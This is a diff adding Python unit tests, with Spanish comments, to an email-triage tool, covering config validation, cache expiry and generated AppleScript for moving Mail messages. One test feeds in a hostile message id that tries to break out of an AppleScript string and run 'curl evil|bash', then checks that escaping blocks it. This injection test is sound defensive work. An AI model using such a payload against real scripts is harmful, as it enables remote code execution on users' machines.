@@ -1098,6 +1098,205 @@ class TestClampSuperficiesQW4(unittest.TestCase):
         self.assertFalse(out["entrada_recortada"])
 
 
+class TestMontarMoverContadoresR2(unittest.TestCase):
+    """QW4-r2 (F10): n_reply_needed contaba mids aunque no se movieran —
+    un consumidor que sumara n_* sobre-contaba los movidos."""
+
+    _BASE = {"cuenta": "iCloud", "origen": "INBOX",
+             "destino_review": "Triage/Review", "destino_archive": "Arch",
+             "mids_review": ["<r@x>"], "mids_archive": ["<a@x>"]}
+
+    def test_reply_que_se_queda_no_cuenta_como_movido(self):
+        datos = dict(self._BASE, mids_reply_needed=["<p@x>", "<q@x>"],
+                     destino_reply_needed="")
+        out = th.cmd_montar_mover(datos)
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["reply_needed_movido"])
+        self.assertEqual(out["n_reply_needed"], 0)
+        self.assertEqual(out["n_reply_omitidos"], 2)
+
+    def test_reply_que_se_mueve_cuenta_y_no_omite(self):
+        datos = dict(self._BASE, mids_reply_needed=["<p@x>"],
+                     destino_reply_needed="Triage/Responder")
+        out = th.cmd_montar_mover(datos)
+        self.assertTrue(out["ok"])
+        self.assertTrue(out["reply_needed_movido"])
+        self.assertEqual(out["n_reply_needed"], 1)
+        self.assertEqual(out["n_reply_omitidos"], 0)
+
+
+class TestCalibrarLeerBordeTTLR2(unittest.TestCase):
+    """QW3-r2 (F3): la vigencia y el mensaje usan el mismo valor redondeado —
+    nunca mas 'edad 7.0 dias > TTL 7 dias'."""
+
+    def _cache_con_edad(self, dias):
+        import json as _json
+        from datetime import datetime, timedelta, timezone
+        perfil = th.cmd_calibrar({"correos": []})
+        perfil["generado_en"] = (datetime.now(timezone.utc)
+                                 - timedelta(days=dias)).isoformat()
+        fh = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False,
+                                         encoding="utf-8")
+        _json.dump(perfil, fh); fh.close()
+        return fh.name
+
+    def test_borde_redondea_a_favor_de_vigente(self):
+        ruta = self._cache_con_edad(7.03)   # round -> 7.0 <= 7
+        try:
+            out = th.cmd_calibrar_leer(ruta, 7)
+        finally:
+            os.unlink(ruta)
+        self.assertTrue(out["vigente"])
+
+    def test_pasado_el_borde_caduca_y_el_motivo_no_se_contradice(self):
+        ruta = self._cache_con_edad(7.06)   # round -> 7.1 > 7
+        try:
+            out = th.cmd_calibrar_leer(ruta, 7)
+        finally:
+            os.unlink(ruta)
+        self.assertFalse(out["vigente"])
+        self.assertIn("7.1", out["motivo"])
+
+
+class TestValidarConfigTiersOrdenR2(unittest.TestCase):
+    """QW1-r2 (auditoria 2026-07-19 r2, F1): QW3 validaba tipos de tiers pero
+    no su orden — umbrales desordenados dejaban un tier inalcanzable con
+    'ok' y cero avisos."""
+
+    def _validar(self, cuerpo_yaml):
+        try:
+            import yaml  # noqa: F401
+        except ImportError:
+            self.skipTest("PyYAML no instalado")
+        fh = tempfile.NamedTemporaryFile("w", suffix=".yaml", delete=False,
+                                         encoding="utf-8")
+        fh.write(cuerpo_yaml)
+        fh.close()
+        try:
+            return th.cmd_validar_config(fh.name)
+        finally:
+            os.unlink(fh.name)
+
+    def test_desordenados_avisa(self):
+        # Repro exacto de la re-auditoria: REVIEW inalcanzable.
+        out = self._validar("correo: {cuenta: a@b.com}\n"
+                            "criterios_epistemicos: {}\n"
+                            "tiers: {reply_needed: 4, review: 10, "
+                            "reading_later: 0}\n")
+        self.assertTrue(out["tiers_desordenados"])
+        self.assertTrue(any("desordenados" in a for a in out["avisos"]))
+
+    def test_desorden_contra_defaults_tambien_avisa(self):
+        # Solo reply_needed: 3 presente -> contra el default review=4
+        # el orden efectivo ya esta roto.
+        out = self._validar("correo: {cuenta: a@b.com}\n"
+                            "criterios_epistemicos: {}\n"
+                            "tiers: {reply_needed: 3}\n")
+        self.assertTrue(out["tiers_desordenados"])
+
+    def test_typo_de_clave_avisa(self):
+        # QW2-r2 (F2): 'reply_neded' caia al default sin señal.
+        out = self._validar("correo: {cuenta: a@b.com}\n"
+                            "criterios_epistemicos: {}\n"
+                            "tiers: {reply_neded: 12, review: 4}\n")
+        self.assertIn("reply_neded", out["tiers_desconocidos"])
+        self.assertTrue(any("desconocidas" in a for a in out["avisos"]))
+
+    def test_claves_canonicas_sin_aviso_de_desconocidas(self):
+        out = self._validar("correo: {cuenta: a@b.com}\n"
+                            "criterios_epistemicos: {}\n"
+                            "tiers: {reply_needed: 10, review: 4}\n")
+        self.assertEqual(out["tiers_desconocidos"], [])
+
+    def test_orden_valido_sin_aviso(self):
+        out = self._validar("correo: {cuenta: a@b.com}\n"
+                            "criterios_epistemicos: {}\n"
+                            "tiers: {reply_needed: 10, review: 4, "
+                            "reading_later: 0, archive: -1}\n")
+        self.assertFalse(out["tiers_desordenados"])
+        self.assertFalse(any("desordenados" in a for a in out["avisos"]))
+
+
+class TestValidarConfigClavesDoctrinaNOr2(unittest.TestCase):
+    """NO-r2 (re-auditoria 2026-07-19 r2, F8/F9): puntuacion.
+    extraccion_cruda_max y puntuacion.perfiles son claves OPCIONALES de
+    doctrina parseable (el runtime no las consume; los gates doctrinales
+    si). validar-config valida tipos si estan presentes y calla si no:
+    retrocompatibilidad total con configs personales anteriores."""
+
+    def _validar(self, cuerpo_yaml):
+        try:
+            import yaml  # noqa: F401
+        except ImportError:
+            self.skipTest("PyYAML no instalado")
+        fh = tempfile.NamedTemporaryFile("w", suffix=".yaml", delete=False,
+                                         encoding="utf-8")
+        fh.write(cuerpo_yaml)
+        fh.close()
+        try:
+            return th.cmd_validar_config(fh.name)
+        finally:
+            os.unlink(fh.name)
+
+    BASE = "correo: {cuenta: a@b.com}\ncriterios_epistemicos: {}\n"
+
+    def test_claves_ausentes_sin_aviso(self):
+        # Un config personal sin las claves nuevas sigue limpio: opcionales.
+        out = self._validar(self.BASE + "puntuacion: {leer_cuerpo: true}\n")
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["extraccion_cruda_max_invalido"])
+        self.assertFalse(out["perfiles_no_mapa"])
+        self.assertEqual(out["perfiles_invalidos"], [])
+        self.assertFalse(any("extraccion_cruda_max" in a or "perfiles" in a
+                             for a in out["avisos"]))
+
+    def test_claves_validas_sin_aviso(self):
+        out = self._validar(
+            self.BASE + "puntuacion:\n  extraccion_cruda_max: 4000\n"
+            "  perfiles: {rapido: 800, equilibrado: 1500, profundo: 2500}\n")
+        self.assertFalse(out["extraccion_cruda_max_invalido"])
+        self.assertFalse(out["perfiles_no_mapa"])
+        self.assertEqual(out["perfiles_invalidos"], [])
+
+    def test_extraccion_no_entera_avisa(self):
+        out = self._validar(
+            self.BASE + "puntuacion: {extraccion_cruda_max: muchos}\n")
+        self.assertTrue(out["extraccion_cruda_max_invalido"])
+        self.assertTrue(any("entero > 0" in a for a in out["avisos"]))
+
+    def test_extraccion_cero_avisa(self):
+        out = self._validar(
+            self.BASE + "puntuacion: {extraccion_cruda_max: 0}\n")
+        self.assertTrue(out["extraccion_cruda_max_invalido"])
+
+    def test_extraccion_booleana_avisa(self):
+        # true es int en Python: el gate debe rechazar bool explicitamente.
+        out = self._validar(
+            self.BASE + "puntuacion: {extraccion_cruda_max: true}\n")
+        self.assertTrue(out["extraccion_cruda_max_invalido"])
+
+    def test_perfiles_no_mapa_avisa(self):
+        out = self._validar(
+            self.BASE + "puntuacion: {perfiles: [800, 1500, 2500]}\n")
+        self.assertTrue(out["perfiles_no_mapa"])
+        self.assertTrue(any("mapeo perfil->caracteres" in a
+                            for a in out["avisos"]))
+
+    def test_perfil_no_numerico_avisa(self):
+        out = self._validar(
+            self.BASE + "puntuacion:\n"
+            "  perfiles: {rapido: rapidito, equilibrado: 1500}\n")
+        self.assertEqual(out["perfiles_invalidos"], ["rapido"])
+        self.assertTrue(any("presupuesto numerico" in a
+                            for a in out["avisos"]))
+
+    def test_perfil_negativo_o_booleano_avisa(self):
+        out = self._validar(
+            self.BASE + "puntuacion:\n"
+            "  perfiles: {profundo: -1, rapido: true, equilibrado: 1500}\n")
+        self.assertEqual(out["perfiles_invalidos"], ["profundo", "rapido"])
+
+
 class TestValidarConfigTiersQW3(unittest.TestCase):
     """QW3 (auditoria 2026-07-19, F5/F22): validar-config no miraba `tiers`.
     Un umbral no numerico pasaba el gate con 'ok' y el scoring reventaba
@@ -1498,6 +1697,146 @@ class TestMontarMoverContratoCompletoCM1(unittest.TestCase):
             self.assertIn("ok", out)
             json.dumps(out, ensure_ascii=False)          # siempre serializable
 
+
+class TestMontarMoverArchivoNativoBlindadoF5(unittest.TestCase):
+    """F5 (re-auditoría 2026-07-19): en archivo nativo, la resolución del buzón
+    "Archive" corría FUERA de todo try; si el buzón no existía (iCloud lo
+    localiza o lo llama "Archived Messages") el SCRIPT 3 podía abortar antes de
+    mover nada, contradiciendo su propio comentario. El fix (seguro bajo AMBAS
+    hipótesis) la envuelve en su try con flag arcBoxOK, gobierna el bloque de
+    archive con un guard y, si el buzón no resuelve, manda TODOS los mids_archive
+    a fallidos_archive con archivo_nativo_fallido:1. El modo NO nativo
+    (destino_archive con carpeta) queda byte-idéntico."""
+
+    def _nat(self, **kw):
+        d = {"cuenta": "iCloud", "origen": "INBOX", "destino_review": "Revisar",
+             "destino_archive": "", "mids_review": ["a@x.com"],
+             "mids_archive": ["b@y.com", "c@z.com"]}
+        d.update(kw)
+        return d
+
+    def _no_nat(self, **kw):
+        d = {"cuenta": "iCloud", "origen": "INBOX", "destino_review": "Revisar",
+             "destino_archive": "Archivo", "mids_review": ["a@x.com"],
+             "mids_archive": ["b@y.com"]}
+        d.update(kw)
+        return d
+
+    def test_nativo_resuelve_arcbox_en_try_con_flag(self):
+        out = th.cmd_montar_mover(self._nat())
+        self.assertTrue(out["ok"])
+        self.assertTrue(out["archivo_nativo"])
+        s = out["script"]
+        for frag in ("set arcBoxOK to true", "set arcNativoFallido to 0",
+                     "on error", "set arcBoxOK to false",
+                     "set arcNativoFallido to 1", "end try"):
+            self.assertIn(frag, s)
+        # el set del buzón vive DENTRO del try: try < set arcBox < on error
+        i_try = s.index("\n    try\n")
+        i_set = s.index('set arcBox to mailbox "Archive" of acct')
+        i_err = s.index("\n    on error\n")
+        self.assertTrue(i_try < i_set < i_err,
+                        "la resolución del buzón nativo no está dentro del try")
+
+    def test_nativo_guard_manda_archive_a_fallidos_si_no_resuelve(self):
+        out = th.cmd_montar_mover(self._nat())
+        s = out["script"]
+        self.assertIn("    if arcBoxOK then\n", s)
+        self.assertIn("        set okArc to 0\n", s)
+        self.assertIn("        set failArc to toArchive\n", s)
+        self.assertIn("    end if\n", s)
+        # el repeat de archive queda gobernado por el guard (if < repeat < else)
+        i_guard = s.index("    if arcBoxOK then\n")
+        i_rep = s.index("repeat with theID in toArchive")
+        i_else = s.index("    else\n")
+        self.assertTrue(i_guard < i_rep < i_else)
+
+    def test_nativo_return_expone_motivo_parseable(self):
+        out = th.cmd_montar_mover(self._nat())
+        s = out["script"]
+        ret = [l for l in s.splitlines() if l.strip().startswith("return ")][0]
+        self.assertIn("archivo_nativo_fallido:", ret)
+        # formato clave:valor, en la sección movidos, antes de los fallidos
+        self.assertLess(ret.index("archivo_nativo_fallido:"),
+                        ret.index("| fallidos_review:"))
+        self.assertGreater(ret.index("archivo_nativo_fallido:"),
+                           ret.index("movidos_archive:"))
+        self.assertIn('"] fallidos_archive:[" & (failArc as string)', s)
+
+    def test_nativo_comentario_dice_la_verdad_nueva(self):
+        out = th.cmd_montar_mover(self._nat())
+        s = out["script"]
+        self.assertIn("el script NO aborta", s)
+        self.assertIn("archivo_nativo_fallido:1", s)     # promesa explícita
+        self.assertIn("define destino_archive con el nombre real", s)
+        # la vieja promesa engañosa ("Si el move falla...") desaparece
+        self.assertNotIn("Si el move falla, esos mids salen", s)
+
+    def test_no_nativo_sin_maquinaria_nativa(self):
+        out = th.cmd_montar_mover(self._no_nat())
+        self.assertFalse(out["archivo_nativo"])
+        s = out["script"]
+        for frag in ("arcBoxOK", "arcNativoFallido",
+                     "archivo_nativo_fallido", "if arcBoxOK then"):
+            self.assertNotIn(frag, s)
+        # el buzón se resuelve en una sola línea, sin try envolvente
+        self.assertIn('    set arcBox to mailbox "Archivo" of acct\n', s)
+
+    def test_no_nativo_hostil_sin_maquinaria_nativa(self):
+        hostil = 'evil") do shell script "curl evil|bash'
+        out = th.cmd_montar_mover(self._no_nat(destino_review='Correo "x"',
+                                               mids_archive=[hostil]))
+        self.assertTrue(out["ok"])
+        s = out["script"]
+        for frag in ("arcBoxOK", "archivo_nativo_fallido", "if arcBoxOK then"):
+            self.assertNotIn(frag, s)
+        # el escape sigue vivo: la comilla del mid no cierra el literal
+        self.assertIn('\\"', s)
+        for ln in s.splitlines():
+            self.assertFalse(ln.strip().startswith("do shell script"))
+
+    def test_nativo_con_reply_movido_conserva_token_y_orden(self):
+        out = th.cmd_montar_mover(self._nat(destino_reply_needed="Responder",
+                                            mids_reply_needed=["r@z.com"]))
+        self.assertTrue(out["reply_needed_movido"])
+        ret = [l for l in out["script"].splitlines()
+               if l.strip().startswith("return ")][0]
+        self.assertIn("movidos_reply:", ret)
+        self.assertIn("archivo_nativo_fallido:", ret)
+        # el token nativo va tras movidos_reply y antes de los fallidos
+        self.assertLess(ret.index("movidos_reply:"),
+                        ret.index("archivo_nativo_fallido:"))
+        self.assertLess(ret.index("archivo_nativo_fallido:"),
+                        ret.index("| fallidos_review:"))
+
+    def test_nativo_bloques_applescript_balanceados(self):
+        out = th.cmd_montar_mover(self._nat())
+        lineas = [l.strip() for l in out["script"].splitlines()]
+        opib = sum(1 for l in lineas if l.endswith(" then"))
+        tells = sum(1 for l in lineas if l.startswith("tell application"))
+        reps = sum(1 for l in lineas if l.startswith("repeat with"))
+        self.assertEqual(opib, lineas.count("end if"))
+        self.assertEqual(lineas.count("try"), lineas.count("end try"))
+        self.assertEqual(reps, lineas.count("end repeat"))
+        self.assertEqual(tells, lineas.count("end tell"))
+        # el fix añade exactamente 1 try envolvente (con on error) y 1 guard if
+        self.assertEqual(lineas.count("try"), 3)         # arcBox + review + archive
+        self.assertEqual(lineas.count("on error"), 1)
+        self.assertEqual(opib, 3)                        # 2 (count>0) + 1 (arcBoxOK)
+
+    def test_nativo_es_total_ante_basura(self):
+        casos = [
+            self._nat(mids_archive="nolista"),
+            self._nat(mids_archive=[{"x": 1}]),
+            self._nat(mids_archive=[None, True]),
+            self._nat(mids_review=[[1, 2]]),
+            self._nat(destino_archive=None, mids_archive=["b@y.com"]),
+        ]
+        for c in casos:
+            out = th.cmd_montar_mover(c)
+            self.assertIsInstance(out, dict)
+            self.assertIn("ok", out)
+            json.dumps(out, ensure_ascii=False)          # siempre serializable
 
 class TestBlindajeScoringEntradaQW1(unittest.TestCase):
     """Auditoría 2026-07-10 (QW1/F1): entradas imperfectas en la ruta de
